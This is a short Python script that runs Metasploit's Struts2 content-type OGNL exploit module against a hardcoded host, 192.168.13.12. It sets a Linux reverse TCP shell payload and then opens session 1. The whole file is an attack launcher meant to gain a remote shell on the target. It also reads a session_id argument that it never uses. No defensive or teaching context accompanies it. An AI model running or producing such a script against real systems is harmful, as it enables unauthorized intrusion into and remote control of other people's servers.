import subprocess
import sys

if len(sys.argv) < 2:
    print("Usage: python launch_metasploit.py <session_id>")
    sys.exit(1)

session_id = sys.argv[1]
subprocess.run(["msfconsole", "-q", "-x", f"use multi/http/struts2_content_type_ognl;set payload payload/linux/x86/shell_reverse_tcp;set RHOSTS 192.168.13.12;run;sessions -i 1"])